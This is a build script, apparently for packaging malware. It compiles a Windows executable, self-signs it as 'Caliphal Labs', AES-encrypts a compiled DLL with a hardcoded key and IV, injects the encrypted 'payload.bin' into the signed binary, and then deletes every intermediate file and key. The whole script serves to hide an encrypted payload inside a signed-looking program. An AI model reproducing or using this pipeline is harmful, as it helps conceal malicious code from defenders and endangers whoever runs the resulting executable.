x86_64-w64-mingw32-gcc -O2 -s -std=c99 main.c -o mvp.exe -limagehlp -lbcrypt

openssl req -x509 -newkey rsa:2048 \
    -keyout key.pem \
    -out cert.pem \
    -days 365 \
    -nodes \
    -subj "/CN=Caliphal Labs"

osslsigncode sign \
    -certs cert.pem \
    -key key.pem \
    -in mvp.exe \
    -out mvp-signed.exe

rm mvp.exe
rm cert.pem
rm key.pem

x86_64-w64-mingw32-gcc -std=c99 -shared dll.c -o dll.dll

KEY=63616c697068616c5f6c61627321212121212121212121212121212121212121
IV=6d76706d76706d76706d76706d76706d

openssl enc -aes-256-cbc \
    -K $KEY \
    -iv $IV \
    -in dll.dll \
    -out payload.bin

rm dll.dll

gcc -O2 inject_payload.c -o inject_payload

./inject_payload mvp-signed.exe payload.bin mvp.exe

rm mvp-signed.exe
rm inject_payload
rm payload.bin